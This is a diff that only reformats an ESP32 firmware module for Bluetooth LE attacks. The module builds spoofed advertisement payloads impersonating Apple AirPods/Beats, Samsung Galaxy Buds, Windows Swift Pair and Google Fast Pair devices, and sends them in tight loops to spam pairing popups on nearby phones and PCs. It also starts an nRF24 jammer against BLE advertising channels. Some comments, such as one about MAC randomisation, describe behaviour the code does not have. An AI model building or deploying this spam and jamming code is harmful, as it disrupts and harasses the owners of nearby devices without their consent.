@@ -18,30 +18,29 @@
  */
 #include "modules/BleAttack/BleAttack.h"
 
-#include <Arduino.h>
-#include <string.h>
-#include <esp_random.h>
-
-#include "NimBLEDevice.h"
 #include "NimBLEAdvertising.h"
+#include "NimBLEDevice.h"
 #include "NimBLEScan.h"
 #include "NimBLEUtils.h"
-
 #include "core/EventBus.h"
 #include "core/State.h"
-#include "hal/Storage.h"
 #include "hal/Board.h"
+#include "hal/Storage.h"
 #include "modules/Nrf24Jammer/Nrf24Jammer.h"
 #include "utils/Logger.h"
+
+#include <Arduino.h>
+#include <esp_random.h>
+#include <string.h>
 
 namespace phm::modules {
 
 BleAttack g_bleAttack;
 
-static constexpr UBaseType_t kTaskPrio  = 2;
-static constexpr uint32_t    kTaskStack = 8192;
-static constexpr BaseType_t  kTaskCore  = 0;
-static constexpr const char* kTag       = "ble";
+static constexpr UBaseType_t kTaskPrio = 2;
+static constexpr uint32_t kTaskStack = 8192;
+static constexpr BaseType_t kTaskCore = 0;
+static constexpr const char* kTag = "ble";
 
 // ---------------------------------------------------------------------------
 // Lifecycle
@@ -86,15 +85,14 @@ bool BleAttack::startAttack(const AttackConfig& cfg) {
         Nrf24Jammer::AttackConfig nj;
         nj.target = Nrf24Jammer::Target::BleAdv;
         nj.method = Nrf24Jammer::Method::List;
-        nj.sweep  = Nrf24Jammer::SweepMode::Together;
+        nj.sweep = Nrf24Jammer::SweepMode::Together;
         g_nrf24Jammer.startAttack(nj);
         return true;
     }
 
     // Spam targets run on a worker task
-    BaseType_t ok = xTaskCreatePinnedToCore(&BleAttack::taskEntry, "ble-spam",
-                                            kTaskStack, this, kTaskPrio,
-                                            &task_, kTaskCore);
+    BaseType_t ok =
+        xTaskCreatePinnedToCore(&BleAttack::taskEntry, "ble-spam", kTaskStack, this, kTaskPrio, &task_, kTaskCore);
     if (ok != pdPASS) {
         running_ = false;
         g_state.currentModuleId = 0;
@@ -116,8 +114,7 @@ void BleAttack::stopAttack() {
         }
     }
     stopAdvertising();
-    if (g_nrf24Jammer.isRunning() &&
-        g_state.currentModuleId == Nrf24Jammer::MODULE_ID) {
+    if (g_nrf24Jammer.isRunning() && g_state.currentModuleId == Nrf24Jammer::MODULE_ID) {
         g_nrf24Jammer.stopAttack();
     }
     running_ = false;
@@ -125,9 +122,11 @@ void BleAttack::stopAttack() {
 }
 
 void BleAttack::stopAdvertising() {
-    if (!owningAdvertising_) return;
+    if (!owningAdvertising_)
+        return;
     NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
-    if (adv) adv->stop();
+    if (adv)
+        adv->stop();
     owningAdvertising_ = false;
 }
 
@@ -138,11 +137,11 @@ void BleAttack::taskEntry(void* arg) {
 
 void BleAttack::workerThread() {
     switch (config_.target) {
-        case Target::AppleSpam:    runAppleSpam();    break;
-        case Target::SamsungSpam:  runSamsungSpam();  break;
-        case Target::WindowsSpam:  runWindowsSpam();  break;
-        case Target::FastPairSpam: runFastPairSpam(); break;
-        default: break;
+    case Target::AppleSpam: runAppleSpam(); break;
+    case Target::SamsungSpam: runSamsungSpam(); break;
+    case Target::WindowsSpam: runWindowsSpam(); break;
+    case Target::FastPairSpam: runFastPairSpam(); break;
+    default: break;
     }
     running_ = false;
     g_state.currentModuleId = 0;
@@ -152,11 +151,13 @@ void BleAttack::workerThread() {
 // ---------------------------------------------------------------------------
 // Scan
 // ---------------------------------------------------------------------------
-namespace { class BleScanCb : public NimBLEScanCallbacks {
+namespace {
+class BleScanCb : public NimBLEScanCallbacks {
 public:
     BleAttack* owner = nullptr;
     void onResult(const NimBLEAdvertisedDevice* dev) override {
-        if (!owner || !dev) return;
+        if (!owner || !dev)
+            return;
         BleAttack::BleDevice d{};
         NimBLEAddress a = dev->getAddress();
         std::string s = a.toString();
@@ -172,7 +173,8 @@ public:
         owner->lastScanResults().push_back(d);
     }
     void onScanEnd(const NimBLEScanResults&, int) override {}
-}; }
+};
+}  // namespace
 static BleScanCb g_scanCb;
 
 void BleAttack::runScan() {
@@ -190,8 +192,7 @@ void BleAttack::runScan() {
     lastResults_.clear();
     bool ok = scan->start(config_.scanDurationMs, false, true);
     if (ok) {
-        LOGI(kTag, "scan: complete (%u results)",
-             static_cast<unsigned>(lastResults_.size()));
+        LOGI(kTag, "scan: complete (%u results)", static_cast<unsigned>(lastResults_.size()));
     } else {
         LOGE(kTag, "scan: start failed");
     }
@@ -205,7 +206,8 @@ void BleAttack::runScan() {
 // ---------------------------------------------------------------------------
 static void startAdvWithPayload(const std::string& payload, bool connectable) {
     NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
-    if (!adv) return;
+    if (!adv)
+        return;
     adv->stop();
     // Use setManufacturerData for the spam payload (NimBLE exposes this
     // for arbitrary bytes that should appear in the manufacturer AD field)
@@ -221,7 +223,7 @@ static void startAdvWithPayload(const std::string& payload, bool connectable) {
 void BleAttack::runAppleSpam() {
     LOGI(kTag, "Apple Continuity spam: start");
     uint8_t payload[64];
-    size_t  payloadLen = 0;
+    size_t payloadLen = 0;
     // Randomise the source MAC so the popups are not deduplicated
     while (running_) {
         buildApplePayload(payload, payloadLen);
@@ -230,7 +232,8 @@ void BleAttack::runAppleSpam() {
         vTaskDelay(pdMS_TO_TICKS(50));
         // Hop to next adv channel (37 -> 38 -> 39 -> 37 ...)
         // NimBLE handles channel rotation internally; nothing to do here.
-        if (!running_) break;
+        if (!running_)
+            break;
     }
     stopAdvertising();
     LOGI(kTag, "Apple Continuity spam: stop");
@@ -239,7 +242,7 @@ void BleAttack::runAppleSpam() {
 void BleAttack::runSamsungSpam() {
     LOGI(kTag, "Samsung Galaxy Buds spam: start");
     uint8_t payload[64];
-    size_t  payloadLen = 0;
+    size_t payloadLen = 0;
     while (running_) {
         buildSamsungPayload(payload, payloadLen);
         startAdvWithPayload(std::string(reinterpret_cast<const char*>(payload), payloadLen), false);
@@ -253,7 +256,7 @@ void BleAttack::runSamsungSpam() {
 void BleAttack::runWindowsSpam() {
     LOGI(kTag, "Windows Swift Pair spam: start");
     uint8_t payload[64];
-    size_t  payloadLen = 0;
+    size_t payloadLen = 0;
     while (running_) {
         buildWindowsPayload(payload, payloadLen);
         startAdvWithPayload(std::string(reinterpret_cast<const char*>(payload), payloadLen), false);
@@ -267,7 +270,7 @@ void BleAttack::runWindowsSpam() {
 void BleAttack::runFastPairSpam() {
     LOGI(kTag, "Google Fast Pair spam: start");
     uint8_t payload[64];
-    size_t  payloadLen = 0;
+    size_t payloadLen = 0;
     while (running_) {
         buildFastPairPayload(payload, payloadLen);
         startAdvWithPayload(std::string(reinterpret_cast<const char*>(payload), payloadLen), false);
@@ -292,15 +295,20 @@ void BleAttack::buildApplePayload(uint8_t* out, size_t& outLen) {
     // Random 16-bit model id (e.g. AirPods Pro, Beats, etc.)
     static const uint16_t kModels[] = {
         0x0220, 0x0F20, 0x1320, 0x0B20, 0x0A20, 0x0320,  // AirPods
-        0x0B30, 0x0E20, 0x1020, 0x0620, 0x0F20,           // Beats
+        0x0B30, 0x0E20, 0x1020, 0x0620, 0x0F20,          // Beats
     };
     static const uint8_t kNumModels = sizeof(kModels) / 2;
     uint16_t model = kModels[esp_random() % kNumModels];
 
-    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
-    out[3] = 0x0B; out[4] = 0xFF;                     // Manufacturer Specific, length 11
-    out[5] = 0x4C; out[6] = 0x00;                     // Apple company id
-    out[7] = 0x07; out[8] = 0x19;                     // Continuity HCI Command type
+    out[0] = 0x02;
+    out[1] = 0x01;
+    out[2] = 0x06;  // Flags
+    out[3] = 0x0B;
+    out[4] = 0xFF;  // Manufacturer Specific, length 11
+    out[5] = 0x4C;
+    out[6] = 0x00;  // Apple company id
+    out[7] = 0x07;
+    out[8] = 0x19;  // Continuity HCI Command type
     out[9] = static_cast<uint8_t>(model & 0xFF);
     out[10] = static_cast<uint8_t>(model >> 8);
     // Random auth tag
@@ -312,19 +320,27 @@ void BleAttack::buildApplePayload(uint8_t* out, size_t& outLen) {
 
 void BleAttack::buildSamsungPayload(uint8_t* out, size_t& outLen) {
     // Galaxy Buds pairing beacon (model 0xEE9A on company 0x0075)
-    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
-    out[3] = 0x03; out[4] = 0xFF;                     // Manufacturer data length 3
-    out[5] = 0x75; out[6] = 0x00;                     // Samsung company id (LE)
-    out[7] = 0xAA;                                    // beacon type
+    out[0] = 0x02;
+    out[1] = 0x01;
+    out[2] = 0x06;  // Flags
+    out[3] = 0x03;
+    out[4] = 0xFF;  // Manufacturer data length 3
+    out[5] = 0x75;
+    out[6] = 0x00;  // Samsung company id (LE)
+    out[7] = 0xAA;  // beacon type
     outLen = 8;
 }
 
 void BleAttack::buildWindowsPayload(uint8_t* out, size_t& outLen) {
     // Microsoft SwiftPair (company 0x0006, beacon 0x03)
-    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
-    out[3] = 0x03; out[4] = 0xFF;
-    out[5] = 0x06; out[6] = 0x00;                     // Microsoft company id
-    out[7] = 0x03;                                    // SwiftPair beacon id
+    out[0] = 0x02;
+    out[1] = 0x01;
+    out[2] = 0x06;  // Flags
+    out[3] = 0x03;
+    out[4] = 0xFF;
+    out[5] = 0x06;
+    out[6] = 0x00;  // Microsoft company id
+    out[7] = 0x03;  // SwiftPair beacon id
     // Subtype + reserved + random salt
     out[8] = 0x00;
     out[9] = static_cast<uint8_t>(esp_random() & 0xFF);
@@ -334,9 +350,13 @@ void BleAttack::buildWindowsPayload(uint8_t* out, size_t& outLen) {
 
 void BleAttack::buildFastPairPayload(uint8_t* out, size_t& outLen) {
     // Google Fast Pair (company 0x000E, model id 0xFE2C or random)
-    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
-    out[3] = 0x03; out[4] = 0xFF;
-    out[5] = 0x0E; out[6] = 0x00;                     // Google company id
+    out[0] = 0x02;
+    out[1] = 0x01;
+    out[2] = 0x06;  // Flags
+    out[3] = 0x03;
+    out[4] = 0xFF;
+    out[5] = 0x0E;
+    out[6] = 0x00;                                       // Google company id
     out[7] = static_cast<uint8_t>(esp_random() & 0xFF);  // model id byte
     out[8] = static_cast<uint8_t>(esp_random() & 0xFF);
     out[9] = 0x00;
